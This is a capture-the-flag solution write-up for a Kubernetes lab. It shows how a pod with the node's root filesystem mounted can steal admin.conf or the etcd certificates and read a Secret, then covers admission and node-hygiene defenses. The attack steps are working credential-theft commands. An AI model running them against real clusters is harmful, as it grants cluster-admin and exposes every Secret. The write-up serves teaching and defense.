# Solution — Keys to the Kingdom

The flag is `KUBE{stolen_node_kubeconfig_is_cluster_admin}`. Below is the intended in-pod path (steal `admin.conf`, use its cert against the API), two alternate routes the same foothold gives you, the failure modes, and the layered defense that makes all of them fail.

## Step 0 — confirm the dead end, then get your shell

First, prove the pod's *own* identity can't reach the flag — this is what forces you to steal a better credential:

```bash
kubectl auth can-i get secrets -n dojo-vault \
  --as=system:serviceaccount:dojo-steal:default
# -> no
```

Now drop into the foothold pod. In a real breach this is an RCE in the agent's image; here you `exec` in directly:

```bash
kubectl -n dojo-steal exec -it foothold -- bash
```

Everything from here runs **inside** the pod. You have no kubeconfig of your own and a worthless token — but you have `/host`, the node's entire root filesystem.

## Step 1 — locate the node's kubeconfig on the mounted filesystem

```bash
ls -l /host/etc/kubernetes/
# admin.conf  controller-manager.conf  kubelet.conf  scheduler.conf  pki/  manifests/ ...
```

Because this pod landed on the **control-plane** node, the jackpot is present:

```bash
head -20 /host/etc/kubernetes/admin.conf
# apiVersion: v1
# clusters:
# - cluster:
#     certificate-authority-data: LS0tLS1CRUdJTi...
#     server: https://dojo-control-plane:6443
# users:
# - name: kubernetes-admin
#   user:
#     client-certificate-data: LS0tLS1CRUdJTi...
#     client-key-data: LS0tLS1CRUdJTi...
```

`admin.conf`'s user is `kubernetes-admin`, whose client certificate carries the group `system:masters` — the hard-wired `cluster-admin` binding that no Role or RoleBinding can revoke. On a **worker** node you'd instead find only `kubelet.conf` (identity `system:node:<name>`, constrained by the Node authorizer to Secrets of pods on *that* node); the setup pins `foothold` to the control plane precisely so you get the unrestricted credential.

## Step 2 — use the stolen credential against the in-cluster API

`netshoot` ships `curl` but not `kubectl`, which is realistic — an attacker rarely gets `kubectl` in a compromised image. Extract the three PEM blobs from the kubeconfig and present them to the API server's in-cluster endpoint:

```bash
A=/host/etc/kubernetes/admin.conf
grep client-certificate-data     "$A" | awk '{print $2}' | base64 -d > /tmp/client.crt
grep client-key-data             "$A" | awk '{print $2}' | base64 -d > /tmp/client.key
grep certificate-authority-data  "$A" | awk '{print $2}' | base64 -d > /tmp/ca.crt

curl -s --cacert /tmp/ca.crt --cert /tmp/client.crt --key /tmp/client.key \
  https://kubernetes.default.svc/api/v1/namespaces/dojo-vault/secrets/kingdom-keys \
  | tr ',' '\n' | grep '"FLAG"' | cut -d'"' -f4 | base64 -d; echo
# -> KUBE{stolen_node_kubeconfig_is_cluster_admin}
```

Why this works:

- `kubernetes.default.svc` is the API server's in-cluster ClusterIP Service — always reachable from any pod.
- The `--cert`/`--key` are the `cluster-admin` client identity. The API server authenticates them to `system:masters`, so authorization is an unconditional yes — `dojo-vault`'s RBAC is irrelevant.
- `.data.FLAG` is base64 (not encrypted). The `tr | grep | cut | base64 -d` pipeline pulls one field with no `jq`.

## Alternate route A — exfiltrate the kubeconfig and use `kubectl`

Copy `admin.conf` off the node and drive it from your Mac, where you have `kubectl`. The one wrinkle: the embedded `server:` is the node-internal `https://dojo-control-plane:6443`, which your host can't resolve — point it at the kind-exported endpoint instead:

```bash
# from the pod, print it so you can copy it out (or `kubectl cp` it):
cat /host/etc/kubernetes/admin.conf

# on your Mac, save it as stolen.conf, then borrow the reachable server URL:
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
kubectl --kubeconfig stolen.conf --server "$APISERVER" --insecure-skip-tls-verify \
  -n dojo-vault get secret kingdom-keys -o jsonpath='{.data.FLAG}' | base64 -d; echo
```

A kubeconfig is portable: `admin.conf` is `cluster-admin` from *anywhere* that can reach the API server. That portability is exactly why a leaked kubeconfig in a CI log or a laptop backup is a cluster-wide incident.

## Alternate route B — skip the API server, read etcd directly

The same `/host` mount that exposed `admin.conf` also exposes etcd's client certs, because you're on the control-plane node. This is Challenge 03's lesson reached by **escape** instead of `docker exec`:

```bash
# etcd listens on 127.0.0.1:2379 on this node; its certs are right here:
ETCDCTL_API=3 etcdctl \
  --cacert=/host/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/host/etc/kubernetes/pki/etcd/server.crt \
  --key=/host/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/dojo-vault/kingdom-keys | strings | grep KUBE
# -> FLAG=KUBE{stolen_node_kubeconfig_is_cluster_admin}
```

(`etcdctl` is not in `netshoot`; if it's missing, use the kubeconfig path above, or `crictl exec` the etcd container as in Challenge 03. The point stands: node access = both the API *and* its datastore.)

## Common failure modes

| What you see | Cause | Fix |
|--------------|-------|-----|
| `/host/etc/kubernetes/admin.conf: No such file` | `foothold` landed on a **worker** node — only `kubelet.conf` is there | Confirm placement: `kubectl -n dojo-steal get pod foothold -o wide` should show the control-plane node; re-run `setup.sh` if the toleration/nodeSelector were edited out |
| `curl: (60) SSL certificate problem` | Wrong CA, or you passed `admin.conf`'s `server:` host | Use the `certificate-authority-data` you decoded into `/tmp/ca.crt`; hit `kubernetes.default.svc`, not the node hostname |
| `curl: (58) unable to set private key file` | `client.key` extracted truncated — the `base64 -d` grabbed a wrapped line | Re-extract; each `*-data` value is a single long token — `awk '{print $2}'` on the exact matching line |
| API returns `403 Forbidden` | You used the pod's token, not the stolen cert | Pass `--cert /tmp/client.crt --key /tmp/client.key`; drop any `Authorization: Bearer` header |
| `kubectl --kubeconfig stolen.conf` hangs | Embedded `server:` is `dojo-control-plane:6443`, unresolvable from your Mac | Override with `--server "$APISERVER"` (the kind-exported `https://127.0.0.1:<port>`) |

> **War story.** On a kind-based CI fleet at SAP, a metrics agent shipped with `hostPath: /` read-write and a blanket `tolerations: operator: Exists` so it would run on *every* node "for complete coverage." It passed review because it "only reads cgroup files." Nobody flagged that `operator: Exists` with no key tolerates **all** taints — including `node-role.kubernetes.io/control-plane:NoSchedule` — so the agent was running on the control plane with the node's `admin.conf` two directories from its mount. We were never breached; a scheduled image scan caught a known RCE in one of its layers first. But the postmortem was blunt: the exposure was never the CVE, it was that a metrics agent could request `hostPath: /` *and* tolerate every taint at all. A single compromised request would have read `admin.conf` and owned the cluster — RBAC, token scoping, and Secret encryption all bypassed, because none of them see a process reading a file on the node. The fix was two admission rules, not a patch. Lesson I keep: **a toleration with `operator: Exists` and no key is a request for the control plane — treat it as a finding every time.**

## The defense — it lives below RBAC

No amount of ServiceAccount scoping protects `kingdom-keys` here, because the attack never used the ServiceAccount. The controls that *do* work sit at admission and node hygiene — stack them:

**1. Forbid `hostPath` (and privilege) on application namespaces with Pod Security Admission.** `restricted` rejects the `foothold` pod at creation time:

```bash
kubectl label ns dojo-steal \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/audit=restricted --overwrite
# re-applying foothold now fails:
# Error from server (Forbidden): pods "foothold" is forbidden: violates PodSecurity
# "restricted:latest": restricted volume types (volume "node-root" uses restricted
# volume type "hostPath"), ...
```

(`dojo-vault` already carries this label — which is why the flag Secret could never be reached by scheduling an escape pod *into* its namespace.)

**2. Keep untrusted workloads off the control plane.** The `node-role.kubernetes.io/control-plane:NoSchedule` taint is there for exactly this. Never add a blanket `tolerations: operator: Exists`; tolerate the *specific* taint only for genuine control-plane DaemonSets, and audit for the blanket form:

```bash
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" tolerations="}{.spec.tolerations}{"\n"}{end}' | grep -i 'operator.:.Exists'
```

**3. Where a genuine `hostPath` need exists** (node-exporter, a CSI driver), scope it to the one subdirectory, mount `readOnly: true`, and run it from a dedicated policy-exempt namespace — never `/`, never read-write, never from an app namespace. Enforce that shape with **Kyverno/OPA**, since PSA's fixed profiles can't express "`hostPath` only under `/var/lib/node-exporter`":

```yaml
# Kyverno: block any hostPath whose path is not an explicit allowlisted subdir
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-hostpath
spec:
  validationFailureAction: Enforce
  rules:
    - name: no-root-hostpath
      match:
        any:
          - resources:
              kinds: ["Pod"]
      validate:
        message: "hostPath mounts are not permitted on application workloads."
        pattern:
          spec:
            =(volumes):
              - X(hostPath): "null"
```

**4. Treat the node and `/etc/kubernetes/pki` as crown jewels, and rotate after any node compromise.** Node access is cluster-admin-equivalent whether RBAC agrees or not. If an attacker ever read `admin.conf` or `/var/lib/etcd`, rotate the cluster CA and every credential — scope the blast-radius assessment to the node's filesystem, not to what the pod's token could do.

Re-run Step 0 after labelling `dojo-steal` restricted: the `foothold` pod can no longer be created, and this challenge becomes unsolvable from a scheduled pod. That is the win — the hole was the admission policy, not the RBAC.
